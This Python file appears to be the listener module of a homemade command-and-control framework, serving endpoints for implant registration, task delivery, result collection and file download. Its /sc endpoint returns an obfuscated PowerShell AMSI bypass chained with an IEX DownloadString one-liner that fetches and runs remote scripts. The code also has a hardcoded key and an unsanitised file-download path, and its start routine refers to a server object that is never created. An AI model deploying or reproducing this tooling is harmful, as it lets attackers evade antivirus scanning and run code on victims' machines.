import sys
import threading
from multiprocessing.context import Process
from random import choice
from string import ascii_uppercase
from common import *
import flask
import json

from agentsHelper import clearAgentTasks, displayResults

from agent import Agent


class Listener:
    def __init__(self, name, port, ip):
        self.flag = 1
        self.name = name
        self.port = port
        self.ip = ip
        self.isRunning = False
        self.Path = "data/listeners/{}".format(self.name)
        self.keyPath = "{}key".format(self.name)
        self.filePath = "{}files/".format(self.Path)
        self.agentsPath = "{}files/".format(self.Path)
        self.app = flask.Flask(__name__)

        # creates the needed directories to store files,
        # and other data like the encryption key and agents’ data
        if not os.path.exists(self.Path):
            os.mkdir(self.Path)
        if not os.path.exists(self.agentsPath):
            os.mkdir(self.agentsPath)
        if not os.path.exists(self.filePath):
            os.mkdir(self.filePath)

        # creates a key, saves it and stores it in a variable
        if not os.path.exists(self.keyPath):
            key = "qqq"
            self.key = key

            with open(self.keyPath, "wt") as f:
                f.write(key)
        else:
            with open(self.keyPath, "rt") as f:
                self.key = f.read()

        # /reg is responsible for handling new agents, it only accepts POST
        # TODO 需要鉴权啥的
        @self.app.route("/reg", methods=['POST'])
        def registerAgent():
            # creates a random string of 6 uppercase letters as the new agent’s name
            name = ''.join(choice(ascii_uppercase) for i in range(6))
            remoteip = flask.request.remote_addr
            hostname = flask.request.form.get("name")
            Type = flask.request.form.get("type")
            success("Agent {} checked in".format(name))
            writeToDatabase(agentsDB, Agent(name, self.name, remoteip, hostname, Type, self.key))
            return (name, 200)

        # the endpoint that agents request to download their tasks
        # <name> is the agent’s name
        @self.app.route("/tasks/<name>", methods=['GET'])
        def serveTasks(name):
            if os.path.exists("{}/{}/tasks".format(self.agentsPath, name)):
                with open("{}{}/tasks".format(self.agentsPath, name), "r") as f:
                    task = f.read()

                clearAgentTasks(name)
                return (task,200)
            else:
                return ('',204)

        # the endpoint that agents request to send results
        @self.app.route("/results/<name>", methods=['POST'])
        def receiveResults(name):
            result = flask.request.form.get("result")
            displayResults(name, result)
            return ('',204)

        #  responsible for downloading files,
        #  <name> is a placeholder for the file name
        @self.app.route("/download/<name>", methods=['GET'])
        def sendFile(name):
            f = open("{}{}".format(self.filePath, name), "rt")
            data = f.read()

            f.close()
            return (data, 200)

        # a wrapper around the /download/<name> endpoint for powershell scripts
        # ??????
        @self.app.route("/sc/<name>", methods=['GET'])
        def sendScript(name):
            amsi = "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](\"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' )).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),(\"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} ); "
            oneliner = "{}IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/download/{}\')".format(amsi,
                                                                                                             self.ip,
                                                                                                             str(
                                                                                                                 self.port),
                                                                                                             name)

            return (oneliner, 200)

    # flask applications don’t provide a reliable way to stop the application
    # only way was to kill the process
    def run(self):
        self.app.logger.disabled = True
        self.app.run(port=self.port, host=self.ip)

    def start(self):
        # self.run()的话会打印flask启动日志，不知道为啥
        self.run()
        # self.server = Process(target=self.run)
        # 全局字典，该字典是python启动后就加载在内存中。
        # 每当导入新的模块，sys.modules都将记录这些模块
        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None

        self.daemon = threading.Thread(name=self.name,
                                       target=self.server.start,
                                       args=())
        # whether this thread is a daemon thread
        self.daemon.daemon = True
        self.daemon.start()

        self.isRunning = True

    def stop(self):

        self.server.terminate()
        self.server = None
        self.daemon = None
        self.isRunning = False
